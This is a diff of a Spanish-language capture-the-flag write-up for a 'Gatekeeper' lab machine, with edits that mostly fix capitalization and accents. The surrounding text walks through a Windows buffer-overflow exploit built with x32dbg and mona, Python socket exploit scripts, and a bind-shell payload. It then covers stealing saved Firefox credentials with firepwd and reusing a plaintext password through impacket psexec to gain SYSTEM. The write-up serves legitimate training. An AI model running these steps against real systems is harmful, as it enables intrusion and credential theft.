@@ -10,13 +10,13 @@
 
 Me pareció interesante el puerto 31337
 
-usamos smb con el objetivo de bajarnos a nuestra maquina el archivo gatekeeper.exe
+Usamos smb con el objetivo de bajarnos a nuestra maquina el archivo gatekeeper.exe
 
 ```smbclient   \\\\(target ip)\\Users``` 
 
 ![2](https://user-images.githubusercontent.com/107126653/172825695-899cc3c4-025e-4050-a6a8-726666a6649b.png)
 
-comandos a usar en windows 
+Comandos a usar en windows 
 ```
 dir  Sirve para listar todo el directorio donde nos encontremos
 cd   Sirve para entrar en un directorio
@@ -32,7 +32,7 @@ Una vez descargado el archivo estarà donde hayamos ejecutado el SMBCLIENT en es
 
 ![6](https://user-images.githubusercontent.com/107126653/172828677-6e0f5f1b-509b-4494-8a82-694483cf3fef.png)
 
-Para el siguiente paso utilizaremos una herramienta muy util ```X32dgb.exe``` https://github.com/therealdreg/x64dbg-exploiting , sería aconsejable que te lo instalases.
+Para el siguiente paso utilizaremos una herramienta muy útil ```X32dgb.exe``` https://github.com/therealdreg/x64dbg-exploiting , sería aconsejable que te lo instalases.
 
 #X32DBG
 
@@ -107,10 +107,9 @@ Puedes utilizar esta plantilla. En IP primero probamos con local host ```127.0.0
 
 ![15](https://user-images.githubusercontent.com/107126653/172839502-88c90fdb-6601-4e96-8df9-d539bcd07eeb.png)
 
-pegamos los 2000 bytes en SHELLCODE entre ' '  o " ". ( te tiene que salir en color gris en vez de en negro). con un CONTROL + S guardamos.
+Pegamos los 2000 bytes en SHELLCODE entre ' '  o " ". ( te tiene que salir en color gris en vez de en negro). con un CONTROL + S guardamos.
 
-Volvemos al X32DBG pulsa restart (arriba izq). Pulsamos run (flecha derecha). Ahora vamos a ejecutar el .py desde una CMD (simbolo del sistema) , en mi caso me instale la ultima version de python 3.10. si te 
-lo instalas de forma generica. estarà localizado aquì. 
+Volvemos al X32DBG pulsa restart (arriba izq). Pulsamos run (flecha derecha). Ahora vamos a ejecutar el .py desde una CMD (simbolo del sistema) , en mi caso me instale la ultima version de python 3.10. si te lo instalas de forma genérica. estará localizado aquí. 
 
 ```C:\Users\xpl\Desktop>C:\Users\xpl\AppData\Local\Programs\Python\Python310\python.exe gatekeeper.writeup.py```
 
@@ -120,10 +119,10 @@ lo instalas de forma generica. estarà localizado aquì.
 
 Si esta todo correcto deberìa salir asì.
 
-Ahora vamos al x32dbg y en EIP hacemos copy y en log utilizaremos este comando ```mona.mona("pattern_offset EIP")``` en lugar de EIP pegamos ( no hace falta copiar y pegar pero es una praxis).
+Ahora vamos al x32dbg y en EIP hacemos copy y en log utilizaremos este comando ```mona.mona("pattern_offset EIP")``` en lugar de EIP pegamos ( no hace falta copiar y pegar pero es una buena praxis).
 
 ![17](https://user-images.githubusercontent.com/107126653/172841149-844eb476-8c1d-4fa6-a8d1-004de3492eea.png)
-Ahora nos indicarà una cantidad de bytes que llena hasta llegar a EIP , que tenemos que introducir.
+Ahora nos indicará una cantidad de bytes que llena hasta llegar a EIP , que tenemos que introducir.
 
 modificamos ahora en el .py
 ```
@@ -171,10 +170,10 @@ para ASEGURARNOS de que la pila esta correctamente posicionada hacemos lo siguie
  Ahora vamos a buscar los bytes  que al programa No le gustan mediante este comando que introduciremos en el LOG:
  ``` mona.mona('bytearray -cpb "\\x00"')```
  
-como resultado tenemos una serie de bytes dnde no encontraremos por ejemplo el x00 que pusimos arriba:
+Como resultado tenemos una serie de bytes dnde no encontraremos por ejemplo el x00 que pusimos arriba:
 ![20](https://user-images.githubusercontent.com/107126653/172850442-73c0754f-cce8-4f94-b9fb-596b1149c664.png)
 
-copiamos y pegamos en el python quedando tal que así:
+Copiamos y pegamos en el python quedando tal que así:
 
 ```
 import socket
@@ -207,11 +206,11 @@ except:
 ```
 *modificamos el python lo guardamos, debug restart , run y ejecutamos el py. del CMD.
 
-ahora utilizamos el comando ```mona.mona('compare -f C:\\logs\\gatekeeper\\bytearray.bin -a ESP')``` que sirve para comparar con los badchars que hayamos introducido en el python.
+Ahora utilizamos el comando ```mona.mona('compare -f C:\\logs\\gatekeeper\\bytearray.bin -a ESP')``` que sirve para comparar con los badchars que hayamos introducido en el python.
 
 ![21](https://user-images.githubusercontent.com/107126653/172854356-676d17ae-3449-4707-b260-25c7db548d78.png)
  
- como veis nos da un badchar que es el   0a asi que repetimos los pasos anteriores. ```mona.mona('bytearray -cpb "\\x00\x0a"')``` luego utilizamos el ```
+ Como veis nos da un badchar que es el   0a asi que repetimos los pasos anteriores. ```mona.mona('bytearray -cpb "\\x00\x0a"')``` luego utilizamos el ```
 mona.mona('compare -f C:\\logs\\gatekeeper\\bytearray.bin -a ESP')```
  
 El gatekeeper.py lo dejaremos asi:
@@ -252,7 +251,7 @@ Hacemos el ```mona.mona('compare -f C:\\logs\\gatekeeper\\bytearray.bin -a ESP')
 HOORRAY!!!! Estos son todos los badchars! .
 
 
-ahora tenemos que conseguir la direccion de retorno mediante este comando  ``mona.mona("jmp -r esp")``
+Ahora tenemos que conseguir la direccion de retorno mediante este comando  ``mona.mona("jmp -r esp")``
 ![23](https://user-images.githubusercontent.com/107126653/172857048-392a61d7-41f9-459e-9c86-7d998b7b19ba.png)
 obtenemos estas direcciones que debemos de introducir en el python pero antes debemos de comprobar que no esten los badchars que hemos conseguido anteriormente.En el python debe quedar así:
 
@@ -291,12 +290,12 @@ try:
 except:
   print("Could not connect.")
 ```
-yo he elegido esta direccion: 0x080414c3 se debe de introducir como esta en el python  de DERECHA A IZQUIERDA.
+Yo he elegido esta dirección: 0x080414c3 se debe de introducir como esta en el python  de DERECHA A IZQUIERDA.
 
 Buscaremos en google una binshell adecuada tomamos como ejemplo está : https://packetstormsecurity.com/files/156148/Windows-x86-Dynamic-Bind-Shell-Null-Free-Shellcode.html
 
-debe quedar así:
-import socket
+Debe quedar así:
+
 ```
 import socket
 
@@ -348,44 +347,44 @@ except:
   print("Could not connect.")
 
  ```
-tenemos que cambiar la ip por el TARGET_IP y escuchar en el puerto 444 a continuación ,abriremos dos CMD , en una estaremos escuchando con NETCAT (TARGET_IP) (PORT) y en la otra ejecutaremos el gatekeeper.py teniendo esta foto como resultado.
+Tenemos que cambiar la ip por el TARGET_IP y escuchar en el puerto 444 a continuación ,abriremos dos CMD , en una estaremos escuchando con NETCAT (TARGET_IP) (PORT) y en la otra ejecutaremos el gatekeeper.py teniendo esta foto como resultado.
 
 ![24](https://user-images.githubusercontent.com/107126653/172870160-13840a00-aecc-4e5f-a446-826237e737dd.png)
 
 
 
 
-# ESCALACION DE PRIVILEGIOS EN LINUX
+# ESCALACIÓN DE PRIVILEGIOS EN LINUX
 
 
 
 
-ejecutamos el gatekeeperwriteup.py dando como resultando:
+Ejecutamos el gatekeeperwriteup.py dando como resultando:
 ![sendin evil](https://user-images.githubusercontent.com/107126653/172893623-b841acbb-dfd8-4a92-b970-1584c8309629.png)
 
 
 
 
-* si tienes problemas para conectarte con NC  prueba cierra la vpn y vuelve a ejecutarla.
+*Si tienes problemas para conectarte con NC  prueba cierra la vpn y vuelve a ejecutarla.
 
 
 
-una vez nos conectamos mediante una BINDSHELL 
+Nos conectamos mediante una BINDSHELL 
 ![natbat](https://user-images.githubusercontent.com/107126653/172892019-9483f563-5444-40ea-b9c9-cce465fef434.png)
 
 
 
 
 
-usando los comandos dde windows podemos conseguir sin dificultad la primera flag siendo la user.txt.txt
+Usando los comandos dde windows podemos conseguir sin dificultad la primera flag siendo la user.txt.txt
 ![natbat flag](https://user-images.githubusercontent.com/107126653/172892126-79db0337-c281-4b41-8c6a-510ff31ce8cf.png)
 
 
 ATENTO A ESTOS PASOS  , COPIA Y PEGALOS LINEA POR LINEA
 
-vamos a esta dirección```C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release```
+Vamos a esta dirección```C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release```
 
-nos bajamos de github este repositorio  a nuestra kali linux ```git clone https://github.com/lclevy/firepwd.git```
+Nos bajamos de github este repositorio  a nuestra kali linux ```git clone https://github.com/lclevy/firepwd.git```
 
                                                             ```wget https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip```
                                                            ```unzip netcat-win32-1.12.zip```
@@ -398,21 +397,21 @@ nos bajamos de github este repositorio  a nuestra kali linux ```git clone https:
                                                               ```mv logins.json firepwd/ ```
                                                               ```mv key4.db firepwd/```
                                                               ```pip install -r requirements.txt```
- cuando ejecutemos este comando  ```python3 firepwd.py``` debe salir:
+ Cuando ejecutemos este comando  ```python3 firepwd.py``` debe salir:
  ![USER Y PASSPWORD](https://user-images.githubusercontent.com/107126653/172899014-f301f890-9363-4b55-b7e4-c030b04a0471.png)
 
-   ejecutamos  ```python3 /usr/share/doc/python3-impacket/examples/psexec.py gatekeeper/mayor:8CL7O1N78MdrCIsV@10.10.29.138 cmd.exe```
+   Ejecutamos  ```python3 /usr/share/doc/python3-impacket/examples/psexec.py gatekeeper/mayor:8CL7O1N78MdrCIsV@10.10.29.138 cmd.exe```
    
    ![system32](https://user-images.githubusercontent.com/107126653/172903722-62caf4ec-b759-4238-8604-85b827b83558.png)
    
 
-   ahora !        ![users root](https://user-images.githubusercontent.com/107126653/173051846-d4e40bb9-4e46-48a3-aabb-2034e229ed3c.png)
+   Ahora !        ![users root](https://user-images.githubusercontent.com/107126653/173051846-d4e40bb9-4e46-48a3-aabb-2034e229ed3c.png)
 
     
                                                 
-   users!         ![amyor desktop](https://user-images.githubusercontent.com/107126653/172903757-111e45fa-88e1-478d-9196-e173be309ea3.png)
+   Users!         ![amyor desktop](https://user-images.githubusercontent.com/107126653/172903757-111e45fa-88e1-478d-9196-e173be309ea3.png)
      
      
-   finalmente!    ![root](https://user-images.githubusercontent.com/107126653/172903935-b0545cae-ccdb-48ed-b085-ea0c58630af6.png)
+   Finalmente!    ![root](https://user-images.githubusercontent.com/107126653/172903935-b0545cae-ccdb-48ed-b085-ea0c58630af6.png)
                                        
                                                     
